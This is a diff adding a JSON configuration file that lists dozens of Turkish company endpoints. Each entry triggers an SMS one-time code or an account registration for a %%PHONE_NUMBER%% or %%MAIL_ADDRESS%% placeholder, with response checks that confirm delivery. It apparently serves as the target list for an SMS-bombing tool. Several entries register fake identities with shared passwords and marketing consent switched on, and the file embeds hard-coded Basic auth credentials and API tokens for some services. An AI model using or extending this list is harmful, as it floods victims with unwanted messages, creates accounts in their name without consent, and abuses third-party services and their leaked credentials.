@@ -1,0 +1,945 @@
+{
+    "post": {
+        "json": [
+            {
+                "name": "IsteGelsin",
+                "validateData": false,
+                "validatePath": "data.sendOtp2.alreadySent",
+                "payload": {
+                    "url": "https://prod.fasapi.net:443/",
+                    "json": {
+                        "operationName": "SendOtp2",
+                        "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}",
+                        "variables": {
+                            "phoneNumber": "90%%PHONE_NUMBER%%"
+                        }
+                    }
+                }
+            },
+            {
+                "name": "Sok",
+                "validateData": true,
+                "validatePath": "meta.messages.success",
+                "payload": {
+                    "url": "https://api.ceptesok.com:443/api/users/sendsms",
+                    "json": {
+                        "mobile_number": "%%PHONE_NUMBER%%",
+                        "token_type": "register_token"
+                    }
+                }
+            },
+            {
+                "name": "Tiklagelsin",
+                "validateData": true,
+                "validatePath": "data.generateOtp",
+                "payload": {
+                    "url": "https://svc.apps.tiklagelsin.com:443/user/graphql",
+                    "json": {
+                        "operationName": "GENERATE_OTP",
+                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
+                        "variables": {
+                            "challenge": "f2523023-283e-46be-b8db-c08f27d3e21c",
+                            "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3",
+                            "phone": "%%PHONE_NUMBER%%"
+                        }
+                    }
+                }
+            },
+            {
+                "name": "Sakasu",
+                "validateData": "ok",
+                "validatePath": "status",
+                "payload": {
+                    "url": "https://www.sakasu.com.tr:443/app/api_register/step1",
+                    "data": {
+                        "phone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Rentiva",
+                "validateData": true,
+                "validatePath": "success",
+                "payload": {
+                    "url": "https://rentiva.com:443/api/Account/Login",
+                    "json": {
+                        "appleId": null,
+                        "code": "",
+                        "email": "",
+                        "facebookId": null,
+                        "googleId": null,
+                        "lastName": "",
+                        "name": "",
+                        "phone": "%%PHONE_NUMBER%%",
+                        "type": 1
+                    }
+                }
+            },
+            {
+                "name": "Bineq",
+                "validateData": true,
+                "validatePath": "IsSuccess",
+                "payload": {
+                    "url": "https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=%%PHONE_NUMBER%%",
+                    "headers": {
+                        "Accept": "application/json, text/plain, */*",
+                        "Content-Type": "application/json",
+                        "Accept-Encoding": "gzip, deflate",
+                        "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Accept-Language": "tr"
+                    }
+                }
+            },
+            {
+                "name": "Link",
+                "validateData": "Ok",
+                "validatePath": "detail",
+                "payload": {
+                    "url": "https://consumer-auth.linkfleet.de:443/consumer_auth/register",
+                    "json": {
+                        "phone_number": "+90%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Defacto",
+                "validateData": true,
+                "validatePath": "Data.IsSMSSend",
+                "payload": {
+                    "url": "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
+                        "Accept": "*/*",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Origin": "https://www.defacto.com.tr",
+                        "Dnt": "1",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Te": "trailers"
+                    },
+                    "data": {
+                        "mobilePhone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Icq",
+                "validateData": 20000,
+                "validatePath": "status.code",
+                "payload": {
+                    "url": "https://u.icq.net:443/api/v92/rapi/auth/sendCode",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
+                        "Accept": "*/*",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Content-Type": "application/json",
+                        "Origin": "https://web.icq.com",
+                        "Dnt": "1",
+                        "Referer": "https://web.icq.com/",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "cross-site",
+                        "Te": "trailers"
+                    },
+                    "json": {
+                        "params": {
+                            "application": "icq",
+                            "devId": "ic1rtwz1s1Hj1O0r",
+                            "language": "en-US",
+                            "phone": "90%%PHONE_NUMBER%%",
+                            "route": "sms"
+                        },
+                        "reqId": "25299-1669396271"
+                    }
+                }
+            },
+            {
+                "name": "Boyner",
+                "validateData": true,
+                "validatePath": "Success",
+                "payload": {
+                    "url": "https://www.boyner.com.tr:443/v2/customerV2/Register",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
+                        "Accept": "application/json, text/plain, */*",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol",
+                        "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=",
+                        "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19",
+                        "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01",
+                        "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336",
+                        "Content-Type": "application/json;charset=utf-8",
+                        "Origin": "https://www.boyner.com.tr",
+                        "Dnt": "1",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Te": "trailers"
+                    },
+                    "json": {
+                        "Captcha": "",
+                        "CaptchaTurn": false,
+                        "ConfirmNewPassword": "31ABC..abc31",
+                        "isGuestQuickBuy": "false",
+                        "Main": {
+                            "CellPhone": "%%PHONE_NUMBER%%",
+                            "Email": "%%MAIL_ADDRESS%%",
+                            "FirstName": "Memati",
+                            "genderid": "1",
+                            "LastName": "Baş",
+                            "month": "12",
+                            "ReceiveCampaignMessages": true,
+                            "year": 1972
+                        },
+                        "MembershipAgreement": true,
+                        "MembershipAgreementClone": true,
+                        "NewPassword": "31ABC..abc31",
+                        "ReturnUrl": "/"
+                    }
+                }
+            },
+            {
+                "name": "Suiste",
+                "validateData": "common.success",
+                "validatePath": "code",
+                "payload": {
+                    "url": "https://suiste.com:443/api/auth/code",
+                    "headers": {
+                        "Accept": "application/json",
+                        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+                        "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2",
+                        "Accept-Language": "tr",
+                        "Accept-Encoding": "gzip, deflate"
+                    },
+                    "data": {
+                        "action": "register",
+                        "gsm": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Hayat",
+                "validateData": true,
+                "validatePath": "IsSuccessful",
+                "payload": {
+                    "url": "https://www.hayatsu.com.tr:443/api/signup/otpsend",
+                    "json": {
+                        "mobilePhoneNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Pisir",
+                "validateData": "1",
+                "validatePath": "ok",
+                "payload": {
+                    "url": "https://api.pisir.com:443/v1/login/",
+                    "json": {
+                        "app_build": "343",
+                        "app_platform": "ios",
+                        "msisdn": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "IkinciYeni",
+                "validateData": true,
+                "validatePath": "isSucceed",
+                "payload": {
+                    "url": "https://apigw.ikinciyeni.com:443/RegisterRequest",
+                    "json": {
+                        "accounttype": 1,
+                        "email": "%%MAIL_ADDRESS%%",
+                        "isAddPermission": true,
+                        "lastName": "Bas",
+                        "name": "Memati",
+                        "phone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "IpraGaz",
+                "validateData": "%%PHONE_NUMBER%%",
+                "validatePath": "phoneNumber",
+                "payload": {
+                    "url": "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
+                    "json": {
+                        "birthDate": "31/08/1975",
+                        "carPlate": "31 ABC 31",
+                        "name": "Memati Bas",
+                        "otp": "",
+                        "phoneNumber": "%%PHONE_NUMBER%%",
+                        "playerId": ""
+                    }
+                }
+            },
+            {
+                "name": "Mogaz",
+                "validateData": "OK",
+                "validatePath": "messageCode",
+                "payload": {
+                    "url": "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister",
+                    "json": {
+                        "address": "",
+                        "birthDate": "31-08-1975",
+                        "city": 0,
+                        "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228",
+                        "district": 0,
+                        "email": "%%MAIL_ADDRESS%%",
+                        "isUserAgreement": true,
+                        "name": "Memati",
+                        "password": "",
+                        "phone": "%%PHONE_NUMBER%%",
+                        "productType": 1,
+                        "subscription": true,
+                        "surname": "Bas"
+                    }
+                }
+            },
+            {
+                "name": "Total",
+                "validateData": true,
+                "validatePath": "success",
+                "payload": {
+                    "url": "https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo=%%PHONE_NUMBER%%&api_key=GetDocuments%0A",
+                    "verify": false
+                }
+            },
+            {
+                "name": "Hey",
+                "validateData": true,
+                "validatePath": "IsSuccess",
+                "payload": {
+                    "url": "https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=%%PHONE_NUMBER%%",
+                    "headers": {
+                        "Accept": "application/json, text/plain, */*",
+                        "Content-Type": "application/json",
+                        "Accept-Encoding": "gzip, deflate",
+                        "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Accept-Language": "tr"
+                    }
+                }
+            },
+            {
+                "name": "Tazi",
+                "validateData": "0000",
+                "validatePath": "kod",
+                "payload": {
+                    "url": "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin",
+                    "headers": {
+                        "Accept": "application/json, text/plain, */*",
+                        "Content-Type": "application/json;charset=utf-8",
+                        "Accept-Encoding": "gzip, deflate",
+                        "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Accept-Language": "tr-TR,tr;q=0.9",
+                        "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
+                    },
+                    "json": {
+                        "cep_tel": "%%PHONE_NUMBER%%",
+                        "cep_tel_ulkekod": "90"
+                    },
+                    "timeout": 5
+                }
+            },
+            {
+                "name": "Isbike",
+                "validateData": "İşlem Başarılı",
+                "validatePath": "sonuc.aciklama",
+                "payload": {
+                    "url": "http://app.isbike.istanbul:80/api/uye/otpsms",
+                    "headers": {
+                        "Content-Type": "application/json",
+                        "Connection": "close",
+                        "Accept": "application/json",
+                        "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0",
+                        "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"
+                    },
+                    "json": {
+                        "cep_tel": "%%PHONE_NUMBER%%",
+                        "cep_tel_ulkekod": 90,
+                        "tip": "MBL_UYE_LOGIN"
+                    },
+                    "timeout": 3
+                }
+            },
+            {
+                "name": "N11",
+                "validateData": true,
+                "validatePath": "isSuccess",
+                "payload": {
+                    "url": "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3",
+                    "headers": {
+                        "Mobileclient": "IOS",
+                        "Content-Type": "application/json",
+                        "Accept": "*/*",
+                        "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F",
+                        "Clientversion": "163",
+                        "Accept-Encoding": "gzip, deflate",
+                        "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Accept-Language": "tr-TR,tr;q=0.9",
+                        "Connection": "close"
+                    },
+                    "json": {
+                        "__hapc": "",
+                        "_deviceId": "696B171-031N-4131-315F-9A76BF60368F",
+                        "channel": "MOBILE_IOS",
+                        "countryCode": "+90",
+                        "email": "%%MAIL_ADDRESS%%",
+                        "gsmNumber": "%%PHONE_NUMBER%%",
+                        "userType": "BUYER"
+                    }
+                }
+            },
+            {
+                "name": "Joker",
+                "validateData": true,
+                "validatePath": "success",
+                "payload": {
+                    "url": "https://www.joker.com.tr:443/kullanici/ajax/check-sms",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+                        "Accept": "application/json, text/javascript, */*; q=0.01",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "X-Requested-With": "XMLHttpRequest"
+                    },
+                    "data": {
+                        "phone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Saka",
+                "validateData": true,
+                "validatePath": "status",
+                "payload": {
+                    "url": "https://mobilcrm2.saka.com.tr:443/api/customer/login",
+                    "json": {
+                        "gsm": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Gofody",
+                "validateData": true,
+                "validatePath": "success",
+                "payload": {
+                    "url": "https://backend.gofody.com:443/api/v1/enduser/register/",
+                    "json": {
+                        "country_code": "90",
+                        "phone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Koctas",
+                "validateData": true,
+                "validatePath": "status",
+                "payload": {
+                    "url": "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp",
+                    "data": {
+                        "givePermission": "true",
+                        "mobileNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Migros",
+                "validateData": true,
+                "validatePath": "successful",
+                "payload": {
+                    "url": "https://rest.migros.com.tr:443/sanalmarket/users/login/otp",
+                    "json": {
+                        "phoneNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Marti",
+                "validateData": true,
+                "validatePath": "isSuccess",
+                "payload": {
+                    "url": "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin",
+                    "json": {
+                        "mobilePhone": "%%PHONE_NUMBER%%",
+                        "mobilePhoneCountryCode": "90",
+                        "oneSignalId": ""
+                    }
+                }
+            }
+        ],
+        "statusCode": [
+            {
+                "name": "Kigili",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://www.kigili.com/users/registration/",
+                    "data": {
+                        "first_name": "Memati",
+                        "last_name": "Bas",
+                        "email": "%%MAIL_ADDRESS%%",
+                        "phone": "0%%PHONE_NUMBER%%",
+                        "password": "31ABC..abc31",
+                        "confirm": "true",
+                        "kvkk": "true",
+                        "next": ""
+                    }
+                }
+            },
+            {
+                "name": "NaosStars",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://shop.naosstars.com/users/register/",
+                    "data": {
+                        "email": "%%MAIL_ADDRESS%%",
+                        "first_name": "Memati",
+                        "last_name": "Bas",
+                        "password": "31ABC..abc31",
+                        "date_of_birth": "1975-12-31",
+                        "phone": "0%%PHONE_NUMBER%%",
+                        "gender": "male",
+                        "kvkk": "true",
+                        "contact": "true",
+                        "confirm": "true"
+                    },
+                    "verify": false
+                }
+            },
+            {
+                "name": "Wmf",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://www.wmf.com.tr/users/register/",
+                    "data": {
+                        "confirm": "true",
+                        "date_of_birth": "1956-03-01",
+                        "email": "%%MAIL_ADDRESS%%",
+                        "email_allowed": "true",
+                        "first_name": "Memati",
+                        "gender": "male",
+                        "last_name": "Bas",
+                        "password": "31ABC..abc31",
+                        "phone": "0%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Bim",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://bim.veesk.net:443/service/v1.0/account/login",
+                    "json": {
+                        "phone": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "A101",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://www.a101.com.tr:443/users/otp-login/",
+                    "data": {
+                        "phone": "0%%PHONE_NUMBER%%",
+                        "next": "/a101-kapida"
+                    }
+                }
+            },
+            {
+                "name": "Englishhome",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://www.englishhome.com:443/enh_app/users/registration/",
+                    "data": {
+                        "first_name": "Memati",
+                        "last_name": "Bas",
+                        "email": "%%MAIL_ADDRESS%%",
+                        "phone": "0%%PHONE_NUMBER%%",
+                        "password": "31ABC..abc31",
+                        "email_allowed": "true",
+                        "sms_allowed": "true",
+                        "confirm": "true",
+                        "tom_pay_allowed": "true"
+                    }
+                }
+            },
+            {
+                "name": "Lonca",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://www.loncamarket.com/lid/identity/sendconfirmationcode",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
+                        "Accept": "application/json, text/javascript, */*; q=0.01",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Content-Type": "application/json; charset=utf-8",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Origin": "https://www.loncamarket.com",
+                        "Dnt": "1",
+                        "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Te": "trailers",
+                        "Connection": "close"
+                    },
+                    "json": {
+                        "Address": "%%PHONE_NUMBER%%",
+                        "ConfirmationType": 0
+                    },
+                    "verify": false,
+                    "timeout": 3
+                }
+            },
+            {
+                "name": "Dgn",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
+                        "Accept": "*/*",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Origin": "https://odeme.dgnonline.com",
+                        "Dnt": "1",
+                        "Referer": "https://odeme.dgnonline.com/?bd=1",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Te": "trailers"
+                    },
+                    "data": {
+                        "loginIdentityNumber": "00000000000",
+                        "loginMobileNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Watsons",
+                "validateData": 201,
+                "payload": {
+                    "url": "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR",
+                    "headers": {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
+                        "Accept": "application/json",
+                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Referer": "https://www.watsons.com.tr/register",
+                        "Content-Type": "application/json;charset=UTF-8",
+                        "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0",
+                        "Origin": "https://www.watsons.com.tr",
+                        "Dnt": "1",
+                        "Sec-Fetch-Dest": "empty",
+                        "Sec-Fetch-Mode": "cors",
+                        "Sec-Fetch-Site": "same-origin",
+                        "Pragma": "no-cache",
+                        "Cache-Control": "no-cache",
+                        "Te": "trailers"
+                    },
+                    "json": {
+                        "countryCode": "TR",
+                        "phoneNumber": "%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Buyur",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://app.buyursungelsin.com:443/api/customer/form/check",
+                    "headers": {
+                        "Accept": "*/*",
+                        "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm",
+                        "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "Accept-Language": "tr-TR,tr;q=0.9"
+                    },
+                    "data": "--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n%%PHONE_NUMBER%%\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
+                }
+            },
+            {
+                "name": "KimGb",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
+                    "json": {
+                        "msisdn": "90%%PHONE_NUMBER%%"
+                    }
+                }
+            },
+            {
+                "name": "Terra",
+                "validateData": 201,
+                "payload": {
+                    "url": "https://api.terrapizza.com.tr:443/api/v1/customers",
+                    "json": {
+                        "email": "%%MAIL_ADDRESS%%",
+                        "emailPermitted": true,
+                        "kvkApproved": true,
+                        "name": "Memati",
+                        "phone": "%%PHONE_NUMBER%%",
+                        "smsPermitted": true,
+                        "surname": "Bas",
+                        "userAgreementApproved": true
+                    }
+                }
+            },
+            {
+                "name": "PetrolOfisi",
+                "validateData": 204,
+                "payload": {
+                    "url": "https://mobilapi.petrolofisi.com.tr:443/api/auth/register",
+                    "headers": {
+                        "Accept": "*/*",
+                        "Content-Type": "application/json",
+                        "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "X-Channel": "IOS",
+                        "Accept-Language": "tr",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Connection": "close"
+                    },
+                    "json": {
+                        "approvedContractVersion": "v1",
+                        "approvedKvkkVersion": "v1",
+                        "contractPermission": true,
+                        "deviceId": "",
+                        "etkContactPermission": true,
+                        "kvkkPermission": true,
+                        "mobilePhone": "0%%PHONE_NUMBER%%",
+                        "name": "Memati",
+                        "plate": "31ABC31",
+                        "positiveCard": "",
+                        "referenceCode": "",
+                        "surname": "Bas"
+                    }
+                }
+            },
+            {
+                "name": "Opet",
+                "validateData": 200,
+                "payload": {
+                    "url": "https://api.opet.com.tr:443/api/authentication/register",
+                    "json": {
+                        "abroadcompanies": [
+                            "1",
+                            "2",
+                            "3"
+                        ],
+                        "birthdate": "1975-08-31T22:00:00.000Z",
+                        "cardNo": null,
+                        "commencisRadio": "true",
+                        "email": "%%MAIL_ADDRESS%%",
+                        "firstName": "Memati",
+                        "googleRadio": "true",
+                        "lastName": "Bas",
+                        "microsoftRadio": "true",
+                        "mobilePhone": "%%PHONE_NUMBER%%",
+                        "opetKvkkAndEtk": true,
+                        "plate": "31ABC31"
+                    },
+                    "timeout": 5
+                }
+            },
+            {
+                "name": "Madame",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://www.madamecoco.com:443/users/registration/",
+                    "headers": {
+                        "Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u",
+                        "X-Project-Name": "undefined",
+                        "Accept": "application/json, text/plain, */*",
+                        "X-App-Type": "akinon-mobile",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Accept-Language": "tr-TR,tr;q=0.9",
+                        "Cache-Control": "no-store",
+                        "Accept-Encoding": "gzip, deflate",
+                        "X-App-Device": "ios",
+                        "Referer": "https://www.madamecoco.com/",
+                        "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"
+                    },
+                    "data": "--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n%%MAIL_ADDRESS%%\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0%%PHONE_NUMBER%%\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
+                }
+            },
+            {
+                "name": "Evidea",
+                "validateData": 202,
+                "payload": {
+                    "url": "https://www.evidea.com:443/users/register/",
+                    "headers": {
+                        "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
+                        "X-Project-Name": "undefined",
+                        "Accept": "application/json, text/plain, */*",
+                        "X-App-Type": "akinon-mobile",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Accept-Language": "tr-TR,tr;q=0.9",
+                        "Cache-Control": "no-store",
+                        "Accept-Encoding": "gzip, deflate",
+                        "X-App-Device": "ios",
+                        "Referer": "https://www.evidea.com/",
+                        "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
+                        "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
+                    },
